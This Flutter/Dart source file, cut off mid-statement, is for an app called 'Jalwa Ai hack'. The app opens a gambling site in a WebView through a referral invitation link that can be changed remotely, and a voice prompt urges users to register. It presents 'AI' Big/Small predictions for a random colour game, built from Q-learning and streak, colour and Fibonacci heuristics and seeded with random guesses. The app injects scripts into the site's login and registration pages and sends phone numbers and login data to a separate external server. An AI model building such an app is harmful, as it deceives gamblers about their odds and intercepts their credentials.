import 'dart:async';
import 'dart:math';
import 'dart:ui'; // Add this import for ImageFilter
import 'dart:convert'; // Add back the import for json encoding/decoding
import 'dart:io'; // Add this for Platform
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:vr_hack/predictionbar.dart';
import 'package:vr_hack/register%20popup.dart';
import 'package:vr_hack/hindi_voice_service.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:webview_flutter_android/webview_flutter_android.dart';
import 'package:webview_flutter_wkwebview/webview_flutter_wkwebview.dart';

import 'package:firebase_core/firebase_core.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:vr_hack/firebase_options.dart';
import 'package:http/http.dart' as http;
import 'package:google_fonts/google_fonts.dart';
import 'package:flutter/rendering.dart';
import 'package:flutter/foundation.dart';

// Simplified Firebase initialization
bool _isFirebaseInitialized = false;

Future<void> initializeFirebase() async {
  if (!_isFirebaseInitialized) {
    int retryCount = 0;
    const maxRetries = 3;

    while (retryCount < maxRetries && !_isFirebaseInitialized) {
      try {
        print(
            '🔥 Initializing Firebase (attempt ${retryCount + 1}/$maxRetries)...');
        await Firebase.initializeApp(
          options: DefaultFirebaseOptions.currentPlatform,
        );
        print('✅ Firebase core initialized successfully');

        // Initialize Remote Config with optimized settings
        final remoteConfig = FirebaseRemoteConfig.instance;
        await remoteConfig.setConfigSettings(RemoteConfigSettings(
          fetchTimeout: const Duration(seconds: 30), // Reduced from 1 minute
          minimumFetchInterval:
              const Duration(minutes: 1), // Reduced from 1 hour
        ));

        // Set default values before fetching
        await remoteConfig.setDefaults({
          'jalwa':
              'https://www.jalwagame.win/#/register?invitationCode=51628510542',
          'is_app_enabled': true,
        });

        print('🔥 Fetching and activating remote config...');
        await remoteConfig.fetchAndActivate();

        _isFirebaseInitialized = true;
        print('✅ Firebase Remote Config initialized successfully');
        break; // Success - exit retry loop
      } catch (e) {
        retryCount++;
        print('❌ Firebase initialization error (attempt $retryCount): $e');

        if (retryCount < maxRetries) {
          print(
              '⏳ Retrying Firebase initialization in ${retryCount * 2} seconds...');
          await Future.delayed(Duration(seconds: retryCount * 2));
        } else {
          print('❌ Firebase initialization failed after $maxRetries attempts');
          print('⚠️ App will continue with limited functionality');
        }
      }
    }
  }
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await initializeFirebase();
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'Jalwa Ai hack',
      theme: ThemeData(
        primarySwatch: Colors.blue,
        visualDensity:
            VisualDensity.adaptivePlatformDensity, // Optimize for platform
      ),
      builder: (context, child) {
        // Optimize performance
        return MediaQuery(
          data: MediaQuery.of(context).copyWith(
            textScaleFactor: 1.0, // Prevent text scaling issues
          ),
          child: child!,
        );
      },
      home: const HackWingoApp(),
    );
  }
}

class HackWingoApp extends StatefulWidget {
  const HackWingoApp({Key? key}) : super(key: key);

  @override
  State<HackWingoApp> createState() => _HackWingoAppState();
}

class GameScreen extends StatefulWidget {
  @override
  _GameScreenState createState() => _GameScreenState();
}

class _GameScreenState extends State<GameScreen> {
  bool _showPredictionBar = false;
  String gameTimer = "00:30";
  String wins = "0";
  String losses = "0";
  String prediction = "Big";
  String periodNumber =
      "Loading..."; // Changed from hardcoded "12" to dynamic loading state
  bool _isMandatoryStarted = false;

  void _handleMandatoryStart() {
    setState(() {
      _isMandatoryStarted = true;
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: PredictionAppBar(
        gameTimer: gameTimer,
        wins: wins,
        losses: losses,
        prediction: prediction,
        periodNumber: periodNumber,
        onMandatoryStart: _handleMandatoryStart,
        isMandatoryStarted: _isMandatoryStarted,
      ),
      body: Center(
        child: ElevatedButton(
          onPressed: () {
            setState(() {
              wins = "1";
              losses = "0";
            });
          },
          child: const Text("Update Results"),
        ),
      ),
    );
  }
}

class CompletePaymentScreen extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.white,
      body: const Center(
        child: Text(
          "Complete Payment",
          style: TextStyle(fontSize: 24, fontWeight: FontWeight.bold),
        ),
      ),
    );
  }
}

class PredictionState {
  final List<int> numbers;
  final List<String> colors;

  PredictionState(this.numbers, this.colors);

  String get key => numbers.join(',') + '|' + colors.join(',');
}

class AIDecision {
  double bigProbability;
  double confidence;
  String reasoning;

  AIDecision(this.bigProbability, this.confidence, this.reasoning);
}

class ReinforcementLearner {
  final Map<String, Map<bool, double>> qTable = {};
  final Map<String, int> stateVisitCount = {};
  final double learningRate = 0.15; // Slightly increased for faster learning
  final double discountFactor =
      0.95; // Higher discount for longer-term thinking
  double explorationRate = 0.2; // Start with higher exploration
  final double minExplorationRate = 0.05;
  final double explorationDecay = 0.995;

  List<PredictionState> stateHistory = [];
  List<bool> actionHistory = [];
  List<double> rewardHistory = [];
  List<double> confidenceHistory = [];
  Map<String, double> stateValues = {};

  double getQValue(PredictionState state, bool action) {
    return qTable[state.key]?[action] ?? 0.0;
  }

  void updateQValue(PredictionState state, bool action, double reward,
      PredictionState? nextState) {
    qTable.putIfAbsent(state.key, () => {});
    qTable[state.key]!.putIfAbsent(action, () => 0.0);

    // Track state visits for UCB exploration
    stateVisitCount[state.key] = (stateVisitCount[state.key] ?? 0) + 1;

    double oldValue = qTable[state.key]![action]!;

    // Enhanced Q-learning with next state consideration
    double maxNextQValue = 0.0;
    if (nextState != null) {
      double bigNextQ = getQValue(nextState, true);
      double smallNextQ = getQValue(nextState, false);
      maxNextQValue = max(bigNextQ, smallNextQ);
    }

    // Temporal difference learning with next state
    double tdTarget = reward + discountFactor * maxNextQValue;
    double newValue = oldValue + learningRate * (tdTarget - oldValue);

    qTable[state.key]![action] = newValue;

    // Update state value for better evaluation
    stateValues[state.key] =
        max(getQValue(state, true), getQValue(state, false));
  }

  AIDecision predict(PredictionState currentState) {
    // Adaptive exploration rate
    explorationRate =
        max(minExplorationRate, explorationRate * explorationDecay);

    // Upper Confidence Bound (UCB) exploration
    if (Random().nextDouble() < explorationRate ||
        _shouldExploreUCB(currentState)) {
      bool randomAction = Random().nextBool();
      return AIDecision(randomAction ? 0.7 : 0.3, 0.4,
          "Exploration mode (ε=${explorationRate.toStringAsFixed(3)})");
    }

    double bigValue = getQValue(currentState, true);
    double smallValue = getQValue(currentState, false);

    // Add confidence bonus based on state visits
    int visits = stateVisitCount[currentState.key] ?? 0;
    double confidenceBonus = visits > 5 ? 0.1 : 0.0;

    double totalValue = bigValue.abs() + smallValue.abs();

    if (totalValue < 0.01) {
      // Use pattern-based fallback when no Q-values exist
      return _patternBasedPrediction(currentState);
    }

    // Softmax action selection for better probability distribution
    double temperature = 2.0; // Controls exploration vs exploitation
    double bigExp = exp(bigValue / temperature);
    double smallExp = exp(smallValue / temperature);
    double probability = bigExp / (bigExp + smallExp);

    // Enhanced confidence calculation
    double valueDifference = (bigValue - smallValue).abs();
    double baseConfidence = min(valueDifference / 2.0, 0.8);
    double confidence = (baseConfidence + confidenceBonus).clamp(0.3, 0.9);

    String reasoning =
        _generateDetailedReasoning(bigValue, smallValue, visits, probability);

    return AIDecision(probability, confidence, reasoning);
  }

  bool _shouldExploreUCB(PredictionState state) {
    int totalVisits = stateVisitCount.values.fold(0, (a, b) => a + b);
    int stateVisits = stateVisitCount[state.key] ?? 0;

    if (totalVisits < 10 || stateVisits < 3) return true;

    // UCB exploration criterion
    double ucbValue = sqrt(log(totalVisits) / stateVisits);
    return ucbValue > 1.5; // Threshold for exploration
  }

  AIDecision _patternBasedPrediction(PredictionState state) {
    if (state.numbers.isEmpty) {
      return AIDecision(0.5, 0.3, "No data - random prediction");
    }

    // Simple pattern analysis as fallback
    int recentBigCount = state.numbers.take(5).where((n) => n >= 5).length;
    double probability = recentBigCount > 2 ? 0.3 : 0.7; // Counter-trend

    return AIDecision(probability, 0.4, "Pattern-based fallback");
  }

  String _generateDetailedReasoning(
      double bigValue, double smallValue, int visits, double probability) {
    List<String> reasons = [];

    reasons.add(
        "Q-values: BIG=${bigValue.toStringAsFixed(3)}, SMALL=${smallValue.toStringAsFixed(3)}");
    reasons.add("State visits: $visits");
    reasons.add(
        "Confidence: ${((bigValue - smallValue).abs() * 50).toStringAsFixed(1)}%");
    reasons.add(
        "Exploration rate: ${(explorationRate * 100).toStringAsFixed(1)}%");

    return reasons.join(" | ");
  }

  void learn(PredictionState state, bool action, double reward,
      {PredictionState? nextState}) {
    stateHistory.add(state);
    actionHistory.add(action);
    rewardHistory.add(reward);

    // Enhanced reward calculation with momentum
    double enhancedReward = _calculateEnhancedReward(reward);

    // Update Q-value with next state information
    updateQValue(state, action, enhancedReward, nextState);

    // Experience replay for better learning
    if (stateHistory.length > 20) {
      _performExperienceReplay();
    }

    // Maintain reasonable history size
    if (stateHistory.length > 50) {
      stateHistory.removeAt(0);
      actionHistory.removeAt(0);
      rewardHistory.removeAt(0);
    }

    // Temporal difference learning for recent experiences
    _updateRecentExperiences();
  }

  double _calculateEnhancedReward(double baseReward) {
    // Add momentum based on recent performance
    if (rewardHistory.length >= 3) {
      double recentAverage = rewardHistory.take(3).reduce((a, b) => a + b) / 3;
      double momentum = recentAverage * 0.2; // 20% momentum factor
      return baseReward + momentum;
    }
    return baseReward;
  }

  void _performExperienceReplay() {
    // Randomly sample from experience for additional learning
    int replayCount = min(5, stateHistory.length);

    for (int i = 0; i < replayCount; i++) {
      int randomIndex = Random().nextInt(stateHistory.length);

      PredictionState replayState = stateHistory[randomIndex];
      bool replayAction = actionHistory[randomIndex];
      double replayReward = rewardHistory[randomIndex];

      // Find next state if available
      PredictionState? nextReplayState;
      if (randomIndex < stateHistory.length - 1) {
        nextReplayState = stateHistory[randomIndex + 1];
      }

      // Reduced learning rate for replay
      double originalLearningRate = learningRate;
      double replayLearningRate = learningRate * 0.5;

      // Temporarily adjust learning rate
      updateQValue(
          replayState, replayAction, replayReward * 0.8, nextReplayState);
    }
  }

  void _updateRecentExperiences() {
    // Update recent experiences with temporal difference
    int lookback = min(3, stateHistory.length - 1);

    for (int i = 0; i < lookback; i++) {
      int index = stateHistory.length - 1 - i;
      if (index <= 0) break;

      PredictionState currentState = stateHistory[index];
      bool currentAction = actionHistory[index];
      double currentReward = rewardHistory[index];
      PredictionState previousState = stateHistory[index - 1];

      // Discounted reward propagation
      double discountedReward = currentReward * pow(discountFactor, i + 1);
      updateQValue(previousState, actionHistory[index - 1], discountedReward,
          currentState);
    }
  }

  // Method to get current learning statistics
  Map<String, dynamic> getLearningStats() {
    int totalStates = qTable.length;
    int totalVisits = stateVisitCount.values.fold(0, (a, b) => a + b);
    double avgReward = rewardHistory.isEmpty
        ? 0.0
        : rewardHistory.reduce((a, b) => a + b) / rewardHistory.length;

    return {
      'totalStates': totalStates,
      'totalVisits': totalVisits,
      'explorationRate': explorationRate,
      'avgReward': avgReward,
      'experienceSize': stateHistory.length,
    };
  }

  // Method to reset learning if performance is consistently poor
  void resetLearning() {
    qTable.clear();
    stateVisitCount.clear();
    stateValues.clear();
    explorationRate = 0.2; // Reset exploration
    print("AI learning reset - starting fresh");
  }
}

class AdvancedPredictor {
  final List<int> numbers;
  final List<String> colors;
  final int wins;
  final int losses;

  // Enhanced pattern weights with dynamic adjustment
  static const double TREND_WEIGHT = 0.30;
  static const double COLOR_WEIGHT = 0.25;
  static const double PATTERN_WEIGHT = 0.30;
  static const double PERFORMANCE_WEIGHT = 0.15;

  AdvancedPredictor(this.numbers, this.colors, this.wins, this.losses);

  Map<String, dynamic> predict() {
    if (numbers.isEmpty) {
      return {
        'prediction': 'BIG',
        'confidence': 0.5,
        'reasoning': 'Insufficient data'
      };
    }

    // Calculate different factors with enhanced algorithms
    double trendProbability = _analyzeTrendAdvanced();
    double colorProbability = _analyzeColorsAdvanced();
    double patternProbability = _analyzePatternsAdvanced();
    double performanceProbability = _analyzePerformanceAdvanced();

    // Dynamic weight adjustment based on recent performance
    Map<String, double> weights = _calculateDynamicWeights();

    // Weighted combination with dynamic weights
    double finalProbability = (trendProbability * weights['trend']!) +
        (colorProbability * weights['color']!) +
        (patternProbability * weights['pattern']!) +
        (performanceProbability * weights['performance']!);

    // Apply sigmoid function for better probability distribution
    finalProbability = _sigmoid(finalProbability);

    // Calculate confidence with multiple factors
    double confidence = _calculateAdvancedConfidence(finalProbability);

    String reasoning = _generateAdvancedReasoning(trendProbability,
        colorProbability, patternProbability, performanceProbability, weights);

    return {
      'prediction': finalProbability > 0.5 ? 'BIG' : 'SMALL',
      'probability': finalProbability,
      'confidence': confidence,
      'reasoning': reasoning
    };
  }

  // Enhanced trend analysis with multiple timeframes
  double _analyzeTrendAdvanced() {
    if (numbers.isEmpty) return 0.5;

    List<int> recent5 = numbers.take(5).toList();
    List<int> recent10 = numbers.take(10).toList();
    List<int> recent20 = numbers.take(20).toList();

    double shortTermBias = _calculateBias(recent5);
    double mediumTermBias = _calculateBias(recent10);
    double longTermBias = _calculateBias(recent20);

    // Weighted combination of different timeframes
    double trendBias =
        (shortTermBias * 0.5) + (mediumTermBias * 0.3) + (longTermBias * 0.2);

    // Anti-streak logic - stronger counter-trend after long streaks
    int currentStreak = _calculateCurrentStreak();
    double streakAdjustment = _calculateStreakAdjustment(currentStreak);

    // Volatility analysis
    double volatility = _calculateVolatility(recent10);
    double volatilityAdjustment = volatility > 0.6 ? 0.1 : -0.1;

    double probability =
        0.5 + trendBias + streakAdjustment + volatilityAdjustment;
    return probability.clamp(0.1, 0.9);
  }

  // Enhanced color analysis with sequence patterns
  double _analyzeColorsAdvanced() {
    if (colors.isEmpty) return 0.5;

    double probability = 0.5;
    List<String> recent = colors.take(8).toList();

    // Color distribution analysis
    Map<String, int> colorCount = {'red': 0, 'green': 0, 'violet': 0};
    for (String color in recent) {
      if (color.contains('red')) colorCount['red'] = colorCount['red']! + 1;
      if (color.contains('green'))
        colorCount['green'] = colorCount['green']! + 1;
      if (color.contains('violet'))
        colorCount['violet'] = colorCount['violet']! + 1;
    }

    // Enhanced color logic with historical patterns
    double redRatio = colorCount['red']! / recent.length;
    double greenRatio = colorCount['green']! / recent.length;
    double violetRatio = colorCount['violet']! / recent.length;

    // Color-based probability adjustment
    if (redRatio > 0.6) {
      probability += 0.25; // Red tends toward BIG
    } else if (greenRatio > 0.6) {
      probability -= 0.25; // Green tends toward SMALL
    }

    // Violet creates uncertainty but can indicate reversal
    if (violetRatio > 0.4) {
      probability = 0.5 + (Random().nextDouble() - 0.5) * 0.3;
    }

    // Color sequence patterns
    if (recent.length >= 3) {
      String lastThreeColors = recent.take(3).join('');
      if (lastThreeColors.contains('red') &&
          lastThreeColors.contains('green')) {
        probability +=
            recent[0].contains('red') ? -0.2 : 0.2; // Alternating pattern
      }
    }

    return probability.clamp(0.1, 0.9);
  }

  // Enhanced pattern recognition with multiple algorithms
  double _analyzePatternsAdvanced() {
    if (numbers.length < 6) return 0.5;

    double probability = 0.5;
    List<int> recent = numbers.take(15).toList();

    // Fibonacci-like sequence detection
    double fibonacciScore = _detectFibonacciPattern(recent);

    // Arithmetic progression detection
    double arithmeticScore = _detectArithmeticPattern(recent);

    // Cyclical pattern detection
    double cyclicalScore = _detectCyclicalPattern(recent);

    // Hot/Cold number analysis
    double hotColdScore = _analyzeHotColdNumbers(recent);

    // Sum pattern analysis
    double sumPatternScore = _analyzeSumPatterns(recent);

    // Combine all pattern scores
    probability += (fibonacciScore * 0.2) +
        (arithmeticScore * 0.2) +
        (cyclicalScore * 0.2) +
        (hotColdScore * 0.2) +
        (sumPatternScore * 0.2);

    return probability.clamp(0.1, 0.9);
  }

  // Enhanced performance analysis with adaptive learning
  double _analyzePerformanceAdvanced() {
    if (wins + losses == 0) return 0.5;

    double winRate = wins / (wins + losses);
    double probability = 0.5;

    // Adaptive strategy based on performance
    if (winRate > 0.7) {
      probability += 0.3; // High confidence in current strategy
    } else if (winRate > 0.6) {
      probability += 0.15; // Moderate confidence
    } else if (winRate < 0.3) {
      probability = 1 - probability; // Invert strategy completely
    } else if (winRate < 0.4) {
      probability += Random().nextDouble() * 0.4 - 0.2; // Add randomness
    }

    // Recent performance trend
    if (numbers.length >= 5) {
      int recentWins = _calculateRecentWins(5);
      double recentWinRate = recentWins / 5.0;
      probability += (recentWinRate - 0.5) * 0.2;
    }

    return probability.clamp(0.1, 0.9);
  }

  // Helper methods for enhanced analysis
  double _calculateBias(List<int> nums) {
    if (nums.isEmpty) return 0.0;
    int bigCount = nums.where((n) => n >= 5).length;
    return (bigCount / nums.length) - 0.5;
  }

  int _calculateCurrentStreak() {
    if (numbers.isEmpty) return 0;
    bool isStreakBig = numbers[0] >= 5;
    int streak = 1;

    for (int i = 1; i < numbers.length && i < 10; i++) {
      if ((numbers[i] >= 5) == isStreakBig) {
        streak++;
      } else {
        break;
      }
    }
    return streak;
  }

  double _calculateStreakAdjustment(int streak) {
    if (streak <= 2) return 0.0;
    if (streak <= 4) return -0.1 * (numbers[0] >= 5 ? 1 : -1);
    if (streak <= 6) return -0.2 * (numbers[0] >= 5 ? 1 : -1);
    return -0.3 * (numbers[0] >= 5 ? 1 : -1);
  }

  double _calculateVolatility(List<int> nums) {
    if (nums.length < 3) return 0.5;
    int changes = 0;
    for (int i = 1; i < nums.length; i++) {
      if ((nums[i] >= 5) != (nums[i - 1] >= 5)) changes++;
    }
    return changes / (nums.length - 1);
  }

  double _detectFibonacciPattern(List<int> nums) {
    // Simplified Fibonacci detection
    if (nums.length < 3) return 0.0;
    int fibMatches = 0;
    for (int i = 2; i < nums.length && i < 8; i++) {
      if (nums[i] == (nums[i - 1] + nums[i - 2]) % 10) fibMatches++;
    }
    return fibMatches > 2 ? 0.3 : 0.0;
  }

  double _detectArithmeticPattern(List<int> nums) {
    if (nums.length < 4) return 0.0;
    List<int> diffs = [];
    for (int i = 1; i < nums.length && i < 6; i++) {
      diffs.add(nums[i] - nums[i - 1]);
    }

    bool isArithmetic = diffs.every((d) => d == diffs[0]);
    return isArithmetic ? 0.25 : 0.0;
  }

  double _detectCyclicalPattern(List<int> nums) {
    if (nums.length < 6) return 0.0;

    // Check for repeating cycles of length 2, 3, 4
    for (int cycleLength = 2; cycleLength <= 4; cycleLength++) {
      bool isCyclical = true;
      for (int i = cycleLength; i < nums.length && i < cycleLength * 3; i++) {
        if (nums[i] != nums[i % cycleLength]) {
          isCyclical = false;
          break;
        }
      }
      if (isCyclical) return 0.3;
    }
    return 0.0;
  }

  double _analyzeHotColdNumbers(List<int> nums) {
    Map<int, int> frequency = {};
    for (int num in nums) {
      frequency[num] = (frequency[num] ?? 0) + 1;
    }

    int mostFrequent =
        frequency.entries.reduce((a, b) => a.value > b.value ? a : b).key;
    return mostFrequent >= 5 ? 0.2 : -0.2;
  }

  double _analyzeSumPatterns(List<int> nums) {
    if (nums.length < 3) return 0.0;

    List<int> sums = [];
    for (int i = 2; i < nums.length && i < 8; i++) {
      sums.add((nums[i - 2] + nums[i - 1] + nums[i]) % 10);
    }

    int bigSums = sums.where((s) => s >= 5).length;
    return (bigSums / sums.length) > 0.6 ? 0.15 : -0.15;
  }

  int _calculateRecentWins(int count) {
    // This would need to be implemented based on actual win/loss tracking
    // For now, return estimated based on win rate
    double winRate = wins / (wins + losses);
    return (winRate * count).round();
  }

  Map<String, double> _calculateDynamicWeights() {
    double totalGames = (wins + losses).toDouble();
    if (totalGames < 10) {
      // Use default weights for insufficient data
      return {
        'trend': TREND_WEIGHT,
        'color': COLOR_WEIGHT,
        'pattern': PATTERN_WEIGHT,
        'performance': PERFORMANCE_WEIGHT,
      };
    }

    double winRate = wins / totalGames;

    // Adjust weights based on performance
    if (winRate > 0.6) {
      // Good performance - trust current strategy more
      return {
        'trend': TREND_WEIGHT * 1.2,
        'color': COLOR_WEIGHT * 1.1,
        'pattern': PATTERN_WEIGHT * 1.1,
        'performance': PERFORMANCE_WEIGHT * 1.3,
      };
    } else if (winRate < 0.4) {
      // Poor performance - rely more on patterns
      return {
        'trend': TREND_WEIGHT * 0.8,
        'color': COLOR_WEIGHT * 0.9,
        'pattern': PATTERN_WEIGHT * 1.4,
        'performance': PERFORMANCE_WEIGHT * 0.7,
      };
    }

    // Average performance - balanced weights
    return {
      'trend': TREND_WEIGHT,
      'color': COLOR_WEIGHT,
      'pattern': PATTERN_WEIGHT,
      'performance': PERFORMANCE_WEIGHT,
    };
  }

  double _sigmoid(double x) {
    return 1 / (1 + exp(-6 * (x - 0.5)));
  }

  double _calculateAdvancedConfidence(double probability) {
    // Multi-factor confidence calculation
    double deviationConfidence = (probability - 0.5).abs() * 2;

    double dataQualityConfidence = min(numbers.length / 20, 1.0);

    double performanceConfidence = 0.5;
    if (wins + losses > 0) {
      double winRate = wins / (wins + losses);
      performanceConfidence = 1 - (winRate - 0.5).abs() * 2;
    }

    double volatilityConfidence =
        1 - _calculateVolatility(numbers.take(10).toList());

    return (deviationConfidence * 0.3 +
            dataQualityConfidence * 0.25 +
            performanceConfidence * 0.25 +
            volatilityConfidence * 0.2)
        .clamp(0.3, 0.95);
  }

  String _generateAdvancedReasoning(double trend, double color, double pattern,
      double performance, Map<String, double> weights) {
    List<String> reasons = [];

    if ((trend - 0.5).abs() > 0.2) {
      reasons.add(
          '${trend > 0.5 ? 'BIG' : 'SMALL'} trend detected (${(trend * 100).toStringAsFixed(1)}%)');
    }

    if ((color - 0.5).abs() > 0.2) {
      reasons.add(
          'Color analysis suggests ${color > 0.5 ? 'BIG' : 'SMALL'} (${(color * 100).toStringAsFixed(1)}%)');
    }

    if ((pattern - 0.5).abs() > 0.2) {
      reasons.add(
          'Pattern recognition indicates ${pattern > 0.5 ? 'BIG' : 'SMALL'} (${(pattern * 100).toStringAsFixed(1)}%)');
    }

    if ((performance - 0.5).abs() > 0.2) {
      reasons.add(
          'Performance history suggests ${performance > 0.5 ? 'BIG' : 'SMALL'} (${(performance * 100).toStringAsFixed(1)}%)');
    }

    // Add dynamic weight information
    String dominantFactor =
        weights.entries.reduce((a, b) => a.value > b.value ? a : b).key;
    reasons.add('Primary factor: $dominantFactor');

    return reasons.join(' | ');
  }
}

class _HackWingoAppState extends State<HackWingoApp> {
  late WebViewController _webViewController;
  bool _isAppEnabled = true;
  String _currentUrl = '';
  String _initialUrl = '';
  bool _isUrlLoaded = false;
  bool _isMandatoryStarted = false;
  bool _showStartButton = true;
  bool _isPredictionWindowVisible = true;
  bool _isPredictionRunning = false;

  final String correctUserNumber = "_username_";
  final String correctPassword = "_password_";

// Declare initial values for the game state
  String _gameTimer = "30";
  String _gamePeriod =
      "Loading..."; // Changed from hardcoded "20250629100000001" to dynamic loading state
  String _prediction = "BIG";
  String _walletBalance = "0.00";

  int _wins = 0;
  int _losses = 0;
  Color _predictionColor = Colors.green;
  List<String> _next5Predictions = [];

  Timer? _updateTimer;
  Timer? _predictionTimer;
  Timer? _debounceTimer;
  bool _showPredictionBar = false;

  // Optimize data tracking
  String _lastPrediction = '';
  String _lastResult = '';
  bool _isAppChecked = false;

  // Cache for reducing API calls
  DateTime _lastWalletCheck = DateTime.now();
  static const Duration _walletCheckInterval = Duration(seconds: 8);

  // Smart update system to reduce WebView load
  String _lastKnownTimer = "30";
  String _lastKnownPeriod = "N/A";
  int _consecutiveFailures = 0;
  static const int _maxConsecutiveFailures = 5;

  // Period change tracking for sliding predictions
  String _lastKnownGamePeriod = "";
  bool _isFirstPeriodLoad = true;

  // AI optimization
  late ReinforcementLearner _ai;
  List<int> _recentNumbers = [];
  List<String> _recentColors = [];
  double _lastConfidence = 0.5;
  final HindiVoiceService _voiceService = HindiVoiceService();
  bool _isVoiceEnabled = true;
  int _lastAnnouncedTimer = -1;
  bool _hasPlayedRegistrationMessage = false;

  // Performance tracking - Increased throttling to reduce frame rate issues
  int _jsExecutionCount = 0;
  DateTime _lastJsExecution = DateTime.now();
  static const Duration _jsThrottleInterval =
      Duration(milliseconds: 3000); // Increased from 1000ms

  @override
  void initState() {
    super.initState();
    print("🏁 initState() started");

    _initializeServices();
    _initializeWebView();
    _loadInitialUrl();
    _checkAppStatus();

    _startOptimizedTimers();
    _checkRemoteConfig();
    _ai = ReinforcementLearner();
    print("🤖 AI ReinforcementLearner initialized");

    // Initialize predictions immediately
    _initializePredictions();

    // Debug: Test period fetching after a delay
    Future.delayed(const Duration(seconds: 5), () {
      _testPeriodFetching();
      _fetchCurrentPeriodFromHistory(); // Also test history-based fetching
    });

    print("🏁 initState() completed");
  }

  void _initializePredictions() {
    print("🚀 _initializePredictions() called");

    // Generate initial random predictions to avoid "Loading..." state
    _next5Predictions =
        List.generate(5, (index) => Random().nextBool() ? "Big" : "Small");
    _prediction = Random().nextBool() ? "BIG" : "SMALL";
    _predictionColor = _prediction == "BIG" ? Colors.yellow : Colors.lightBlue;

    print("✅ Initial predictions generated:");
    print("   _prediction: $_prediction");
    print("   _next5Predictions: $_next5Predictions");
    print("   _next5Predictions.length: ${_next5Predictions.length}");
    print("   _gamePeriod at initialization: '$_gamePeriod'");

    // Force UI update
    if (mounted) {
      setState(() {});
      print("✅ setState() called to update UI");
    }

    // After a short delay, generate advanced AI predictions
    Future.delayed(const Duration(seconds: 2), () {
      if (mounted) {
        _generateNext5Predictions();
      }
    });
  }

  Future<void> _initializeServices() async {
    try {
      await _voiceService.initialize();
      if (_voiceService.isInitialized) {
        print('Voice service initialized successfully');
      }
    } catch (e) {
      print('Error initializing voice service: $e');
    }
  }

  void _triggerRegistrationMessage() {
    if (_isVoiceEnabled && _voiceService.isInitialized) {
      _voiceService.speakRegistrationMessage();
    }
  }

  Future<void> _initializeWebView() async {
    _webViewController = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..setBackgroundColor(Colors.black)
      ..setNavigationDelegate(
        NavigationDelegate(
          onPageFinished: (String url) async {
            if (url.contains('login')) {
              await _injectLoginHandler();
            } else if (url.contains('register')) {
              await _injectRegistrationHandler();
            }
            _checkPageUrl(url);
          },
        ),
      )
      ..addJavaScriptChannel(
        'Debug',
        onMessageReceived: (JavaScriptMessage message) {
          print('Debug: ${message.message}');
        },
      )
      ..addJavaScriptChannel(
        'CheckUsername',
        onMessageReceived: (JavaScriptMessage message) async {
          try {
            final phone = message.message;
            print('Checking phone number: $phone');

            final response = await http.post(
              Uri.parse('https://auth-d0ci.onrender.com/api/check-user'),
              headers: {'Content-Type': 'application/json'},
              body: jsonEncode({'phone': phone}),
            );

            if (response.statusCode == 200) {
              final data = jsonDecode(response.body);
              final isValid = data['exists'] ?? false;
              print('Phone validation result: $isValid');

              await _webViewController.runJavaScript("""
                window.dispatchEvent(new CustomEvent('phoneValidated', {
                  detail: { isValid: $isValid }
                }));
              """);
            } else {
              print('Error checking phone: ${response.statusCode}');
              await _webViewController.runJavaScript("""
                window.dispatchEvent(new CustomEvent('phoneValidated', {
                  detail: { isValid: false }
                }));
              """);
            }
          } catch (e) {
            print('Error checking phone: $e');
            await _webViewController.runJavaScript("""
              window.dispatchEvent(new CustomEvent('phoneValidated', {
                detail: { isValid: false }
              }));
            """);
          }
        },
      )
      ..addJavaScriptChannel(
        'Login',
        onMessageReceived: (JavaScriptMessage message) async {
          try {
            final data = jsonDecode(message.message);
            final response = await http.post(
              Uri.parse('https://auth-d0ci.onrender.com/api/login'),
              headers: {'Content-Type': 'application/json'},
              body: jsonEncode(data),
            );

            if (response.statusCode == 200) {
              print('Login successful');
              _webViewController
                  .loadRequest(Uri.parse("https://www.jalwagame.win/#/"));
            } else {
              print('Login failed: ${response.body}');
            }
          } catch (e) {
            print('Login error: $e');
          }
        },
      );

    // Optimize WebView settings for better performance
    if (Platform.isAndroid) {
      final androidController =
          _webViewController.platform as AndroidWebViewController;
      await androidController.setMediaPlaybackRequiresUserGesture(false);
    }
  }

  Future<void> _loadInitialUrl() async {
    try {
      print('🔥 Starting Firebase Remote Config fetch...');
      final remoteConfig = FirebaseRemoteConfig.instance;

      // Configure fetch settings for better reliability
      await remoteConfig.setConfigSettings(RemoteConfigSettings(
        fetchTimeout: const Duration(seconds: 30), // Increased timeout
        minimumFetchInterval:
            const Duration(minutes: 1), // Allow frequent updates
      ));

      // Set default values as fallback
      await remoteConfig.setDefaults({
        'jalwa':
            'https://www.jalwagame.win/#/register?invitationCode=51628510542',
        'is_app_enabled': true,
      });

      print('🔥 Fetching remote config...');
      await remoteConfig.fetch();

      print('🔥 Activating remote config...');
      bool activated = await remoteConfig.activate();
      print('🔥 Remote config activated: $activated');

      // Get the URL with proper validation
      String fetchedUrl = remoteConfig.getString('jalwa').trim();
      print('🔥 Fetched URL: "$fetchedUrl"');

      // Validate the URL
      if (fetchedUrl.isNotEmpty && _isValidUrl(fetchedUrl)) {
        _initialUrl = fetchedUrl;
        print('✅ Using fetched URL: $_initialUrl');
      } else {
        _initialUrl =
            "https://www.jalwagame.win/#/register?invitationCode=51628510542";
        print('⚠️ Using default URL due to invalid/empty fetched URL');
      }

      setState(() {
        _isUrlLoaded = true;
      });

      print('🌐 Loading URL: $_initialUrl');
      await _webViewController.loadRequest(Uri.parse(_initialUrl));

      // Check if initial URL is registration page
      if (_initialUrl.contains('register') && _isVoiceEnabled) {
        Future.delayed(const Duration(milliseconds: 3000), () {
          if (!_hasPlayedRegistrationMessage) {
            _hasPlayedRegistrationMessage = true;
            _voiceService.speakRegistrationMessage();
          }
        });
      }

      // Start fetching game data immediately after page loads
      Future.delayed(const Duration(seconds: 3), () {
        print("🚀 Starting immediate data fetch after page load...");
        _fetchOptimizedGameData();
        _fetchCurrentPeriodFromHistory();
        _fetchBasicGameData();
      });
    } catch (e) {
      print('❌ Error loading Remote Config: $e');

      // Fallback to default URL
      _initialUrl =
